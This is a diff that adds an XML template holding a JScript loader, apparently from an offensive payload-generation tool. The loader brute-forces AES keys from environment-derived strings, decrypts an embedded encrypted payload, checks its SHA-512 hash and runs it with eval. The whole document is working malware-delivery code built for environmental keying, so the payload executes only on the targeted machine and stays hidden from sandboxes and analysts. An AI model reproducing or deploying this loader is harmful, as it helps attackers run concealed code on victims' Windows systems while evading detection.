@@ -1,0 +1,110 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<language>
+  <name>jscript</name>
+  <extension>js</extension>
+  <baseCode>
+var shell = new ActiveXObject('WScript.Shell');
+ver = 'v4.0.30319';
+try {
+    shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
+} catch(e) { 
+    ver = 'v2.0.50727';
+}
+shell.Environment('Process')('COMPLUS_Version') = ver;
+function decryptAES(decryptMe, key, iv) { 
+    var aes = new ActiveXObject("System.Security.Cryptography.RijndaelManaged");
+    var a = new ActiveXObject("System.Text.ASCIIEncoding");
+    aes.Mode = 1; //CBC
+    aes.Padding = 2; //PKCS7
+    aes.BlockSize = 128;
+    aes.KeySize = 256;
+    aes.IV = decodeBase64(iv);
+    aes.Key = a.GetBytes_4(key);
+
+    var encBytes = decodeBase64(decryptMe);
+    var encLen = (a.GetByteCount_2(decryptMe) / 4) * 3;
+    encLen = encLen - (decryptMe.split("=").length - 1)
+
+    var decrypted = aes.CreateDecryptor().TransformFinalBlock(encBytes,0,encLen);
+    return a.GetString(decrypted);
+}
+function decodeBase64(base64) {
+    var dm = new ActiveXObject("Microsoft.XMLDOM");
+    var el = dm.createElement("tmp");
+    el.dataType = "bin.base64";
+    el.text = base64
+    return el.nodeTypedValue
+}
+function binToHex(binary) {
+    var dom = new ActiveXObject("Microsoft.XMLDOM");
+    var el = dom.createElement("tmp");
+    el.dataType = "bin.hex";
+    el.nodeTypedValue = binary;
+    el.removeAttribute("dt:dt");
+    return el.nodeTypedValue
+}
+function getSHA512(bytes) {
+    var sha512 = new ActiveXObject("System.Security.Cryptography.SHA512Managed");
+    var text = new ActiveXObject("System.Text.ASCIIEncoding");
+    var result = binToHex(sha512.ComputeHash_2((text.GetBytes_4(bytes))));
+    return result
+}
+function compareHash(decrypted, hash, minusBytes) {
+    var sha512 = new ActiveXObject("System.Security.Cryptography.SHA512Managed");
+    var text = new ActiveXObject("System.Text.ASCIIEncoding");
+    var newHash = getSHA512(decrypted.substring(0, (decrypted.length - minusBytes)));
+    if(newHash == hash) {
+        return true;
+    }
+    else {
+        return false;
+    }
+}
+function getCombinations(chars) {
+    var result = [];
+    var f = function(prefix, chars) {
+      for (var i = 0; i &lt; chars.length; i++) {
+        result.push(prefix + chars[i]);
+        f(prefix + chars[i], chars.slice(i + 1));
+      }
+    }
+    f('', chars);
+    return result;
+}
+
+function tryKeyCombos(combos, path, encrypted, payloadHash, aesIVBase64, minusBytes) {
+    for(k = 0; k &lt; combos.length; k++) {
+        var key = combos[k].toLowerCase() + path.toLowerCase();
+
+        key = getSHA512(key);
+        key = key.substring(0,32);
+        try {
+            var decrypted = decryptAES(encrypted, key, aesIVBase64)
+            if(compareHash(decrypted, payloadHash, minusBytes)) {
+                eval(decrypted);
+                return;
+            }
+        }
+        catch(err) {}
+    }
+    return "";
+}
+
+{{.Functions}}
+
+var idx = 0;
+do {
+    var chains = [], combos = [];
+    chains.push("");
+    combos.push("");
+
+    {{.Callers}}
+
+    combos = getCombinations(combos);
+    for(i = 0; i &lt; chains.length; i++) {
+        tryKeyCombos(combos, chains[i], "{{.EncryptedBase64}}", "{{.PayloadHash}}", "{{.AESIVBase64}}", {{.MinusBytes}})
+    }
+    idx++;
+} while(idx &lt; {{.Retries}});
+  </baseCode>
+</language>
